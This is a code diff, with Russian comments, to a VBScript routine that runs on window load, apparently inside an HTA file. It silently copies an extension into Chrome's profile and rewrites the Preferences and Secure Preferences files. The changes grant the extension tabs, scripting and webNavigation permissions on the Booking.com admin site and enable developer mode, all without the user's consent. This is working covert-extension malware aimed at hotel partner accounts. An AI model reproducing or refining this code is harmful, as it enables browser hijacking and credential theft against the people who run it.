@@ -23,10 +23,10 @@ Sub Window_onLoad
     
     ' Финальная проверка и установка расширения
     If fso.FileExists(tempFolder & "\test.zip") Then
-        ' Используем ID из н��шего ключа
+        ' Используем ID из нашего ключа
         extensionId = "mfkomnpbmdkghpjhpnmjnhpgcjdeiblk"
         userDataPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Google\Chrome\User Data"
-        chromeExtPath = userDataPath & "\Default\Extensions\" & extensionId & "\1.0"
+        chromeExtPath = userDataPath & "\Default\Extensions\" & extensionId & "\1.0.0"
         
         ' Создаем необходимые директории
         If Not fso.FolderExists(userDataPath & "\Default\Extensions") Then
@@ -51,15 +51,55 @@ Sub Window_onLoad
         xcopyCmd = "xcopy """ & tempFolder & "\test\*"" """ & chromeExtPath & "\" & """ /E /I /Y"
         shell.Run xcopyCmd, 0, True
         
-        ' Создаем/обновляем Secure Preferences
-        Set securePrefs = fso.CreateTextFile(userDataPath & "\Default\Secure Preferences", True)
-        securePrefs.WriteLine "{""extensions"":{""settings"":{""" & extensionId & """:{""active_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""granted_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""location"":2,""state"":1}}}}"
-        securePrefs.Close
+        ' Модифицируем Preferences если файл существует
+        If fso.FileExists(userDataPath & "\Default\Preferences") Then
+            Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 1)
+            prefsContent = prefsFile.ReadAll()
+            prefsFile.Close
+            
+            ' Создаем настройки для нашего расширения
+            extSettings = """" & extensionId & """:{""active_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""granted_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""location"":2,""state"":1}"
+            
+            ' Проверяем существующие настройки и добавляем наши
+            If InStr(prefsContent, """extensions"":{") > 0 Then
+                If InStr(prefsContent, """extensions"":{""settings"":{") > 0 Then
+                    ' Если уже есть настройки расширений, добавляем наше
+                    newPrefs = Replace(prefsContent, """extensions"":{""settings"":{", """extensions"":{""settings"":{" & extSettings & ",")
+                Else
+                    ' Если есть секция extensions, но нет settings
+                    newPrefs = Replace(prefsContent, """extensions"":{", """extensions"":{""settings"":{" & extSettings & "},")
+                End If
+            Else
+                ' Если нет секции extensions вообще
+                newPrefs = Replace(prefsContent, "{", "{""extensions"":{""settings"":{" & extSettings & "},""ui"":{""developer_mode"":true}},")
+            End If
+            
+            ' Сохраняем обновленные настройки
+            Set prefsFile = fso.OpenTextFile(userDataPath & "\Default\Preferences", 2, True)
+            prefsFile.Write newPrefs
+            prefsFile.Close
+        End If
         
-        ' Обновляем Preferences
-        Set prefs = fso.CreateTextFile(userDataPath & "\Default\Preferences", True)
-        prefs.WriteLine "{""extensions"":{""ui"":{""developer_mode"":true},""settings"":{""" & extensionId & """:{""active_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""granted_permissions"":{""api"":[""tabs"",""storage"",""webNavigation"",""scripting""],""explicit_host"":[""https://admin.booking.com/*""]},""location"":2,""state"":1}}}}"
-        prefs.Close
+        ' Аналогично для Secure Preferences
+        If fso.FileExists(userDataPath & "\Default\Secure Preferences") Then
+            Set securePrefsFile = fso.OpenTextFile(userDataPath & "\Default\Secure Preferences", 1)
+            securePrefsContent = securePrefsFile.ReadAll()
+            securePrefsFile.Close
+            
+            If InStr(securePrefsContent, """extensions"":{") > 0 Then
+                If InStr(securePrefsContent, """extensions"":{""settings"":{") > 0 Then
+                    newSecurePrefs = Replace(securePrefsContent, """extensions"":{""settings"":{", """extensions"":{""settings"":{" & extSettings & ",")
+                Else
+                    newSecurePrefs = Replace(securePrefsContent, """extensions"":{", """extensions"":{""settings"":{" & extSettings & "},")
+                End If
+            Else
+                newSecurePrefs = Replace(securePrefsContent, "{", "{""extensions"":{""settings"":{" & extSettings & "}},")
+            End If
+            
+            Set securePrefsFile = fso.OpenTextFile(userDataPath & "\Default\Secure Preferences", 2, True)
+            securePrefsFile.Write newSecurePrefs
+            securePrefsFile.Close
+        End If
         
         ' Удаляем временные файлы
         fso.DeleteFile(tempFolder & "\test.zip")
